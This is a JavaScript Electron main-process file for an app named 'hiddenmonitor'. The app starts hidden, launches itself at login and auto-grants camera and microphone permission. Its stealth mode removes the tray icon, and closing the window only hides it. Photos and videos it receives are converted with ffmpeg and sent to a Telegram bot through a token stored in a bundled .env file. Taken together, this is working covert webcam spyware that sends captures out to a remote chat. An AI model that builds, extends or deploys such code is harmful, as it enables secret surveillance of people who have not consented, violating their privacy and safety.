const { app, BrowserWindow, session, Tray, Menu, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');
const { exec } = require("child_process");
const os = require("os");
const axios = require("axios");
const FormData = require("form-data");

require("dotenv").config({
  path: app.isPackaged
    ? path.join(process.resourcesPath, ".env")
    : path.join(__dirname,"..", ".env")
});

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

let ffmpegPath;

if (app.isPackaged) {
  ffmpegPath = path.join(process.resourcesPath, "ffmpeg-static", "ffmpeg.exe");
} else {
  ffmpegPath = require("ffmpeg-static");
}

console.log("FFmpeg path:", ffmpegPath);
console.log("Exists:", fs.existsSync(ffmpegPath));

const { globalShortcut } = require('electron');
const store = require('./config');

let win;
let tray;

ipcMain.on('send-photo', async (event, base64Image) => {
  try {
    const token = BOT_TOKEN;
    const chatId = CHAT_ID;
    const base64Data = base64Image.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");

    const formData = new FormData();

    formData.append("chat_id", chatId);
    formData.append("photo", buffer, {
      filename: "photo.png",
      contentType: "image/png"
    });

    const response = await axios.post(
      `https://api.telegram.org/bot${token}/sendPhoto`,
      formData,
      {
        headers: formData.getHeaders()
      }
    );

    console.log("Photo response:", response.data);

  } catch (err) {
    console.error("Send photo error:", err.response?.data || err);
  }
});


ipcMain.on('send-video', async (event, videoArrayBuffer) => {
  try {
    const token = BOT_TOKEN;
    const chatId = CHAT_ID;

    const buffer = Buffer.from(videoArrayBuffer);

    const tempWebm = path.join(os.tmpdir(), `video_${Date.now()}.webm`);
    const tempMp4 = path.join(os.tmpdir(), `video_${Date.now()}.mp4`);

    fs.writeFileSync(tempWebm, buffer);

    if (!fs.existsSync(ffmpegPath)) {
      console.error("FFMPEG not found:", ffmpegPath);
      return;
    }

    exec(`"${ffmpegPath}" -y -i "${tempWebm}" -vcodec libx264 -acodec aac -preset fast -crf 28 "${tempMp4}"`,
      async (err) => {

        if (err) {
          console.error("Convert error:", err);
          return;
        }

        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("video", fs.createReadStream(tempMp4));

        const response = await axios.post(
          `https://api.telegram.org/bot${token}/sendVideo`,
          formData,
          {
            headers: formData.getHeaders(),
            maxContentLength: Infinity,
            maxBodyLength: Infinity
          }
        );

        console.log("Telegram response:", response.data);

        fs.unlinkSync(tempWebm);
        fs.unlinkSync(tempMp4);
      }
    );

  } catch (err) {
    console.error("Send video error:", err.response?.data || err);
  }
});



function createWindow() {
  win = new BrowserWindow({
    width: 800,
    height: 600,
    show: false, // không hiện lúc start
    webPreferences: {
      preload: path.join(__dirname, "preload.js"),
      contextIsolation: true,
      nodeIntegration: false
    }
  });

  win.loadFile('src/index.html');

  win.on('close', (event) => {
    if (!app.isQuiting) {
      event.preventDefault();
      win.hide();
    }
  });
}

app.whenReady().then(() => {

  app.setAppUserModelId("com.hiddenmonitor.app");

  app.setLoginItemSettings({
    openAtLogin: true,
    path: app.getPath("exe")
  });

  session.defaultSession.setPermissionRequestHandler((webContents, permission, callback) => {
    callback(permission === 'media');
  });

  createWindow();

  const hotkey = store.get('hotkey');
  console.log(`Dang thu dang ky hotkey: ${hotkey}`)

  const ret = globalShortcut.register(hotkey, () => {
    console.log(`Hotkey ${hotkey}`);

    if (win.isVisible()) {
      win.hide();

      console.log('Cua so da an')
    } else {
      win.show();
      win.focus(); // Đưa lên foreground

      console.log('Cua so da hien')
    }
  });

  if (!ret) {
    console.error(`Dang ky hotkey that bai: ${hotkey}`)
    console.error('Ly do co the do hotkey bi chiem o ung dung khac! Thu thay doi trong config.json');

    if (win && win.isVisible()) {
      win.webContents.executeJavaScript(`alert("Hotkey ${hotkey} khong dang ky duoc")`)
    }
  } else {
    console.log(`Hotkey ${hotkey} da duoc dang ky thanh cong`)
  }

  const isStealth = store.get('stealthMode');

  if (!isStealth) {
    // Chỉ tạo tray nếu không ở stealth mode
    let iconPath;

    if (app.isPackaged) {
      iconPath = path.join(process.resourcesPath, 'public', 'icon.ico');
    } else {
      iconPath = path.join(__dirname, '..', 'public', 'icon.ico');
    }


    if (fs.existsSync(iconPath)) {

      tray = new Tray(iconPath);

      const contextMenu = Menu.buildFromTemplate([
        {
          label: 'Mở lại',
          click: () => {
            if (win) win.show();
          }
        },
        {
          label: 'Thoát',
          click: () => {
            app.isQuiting = true;
            app.quit();
          }
        }
      ]);

      tray.setToolTip('Webcam is running');
      tray.setContextMenu(contextMenu);

    }
  } else {
    console.warn('Chay o Full Steal Mode - Khong tray Icon');
  }
});

// Cleanup hotkey khi thoát
app.on('will-quit', () => {
  globalShortcut.unregisterAll();
})

app.on('window-all-closed', (e) => {
  e.preventDefault();
});
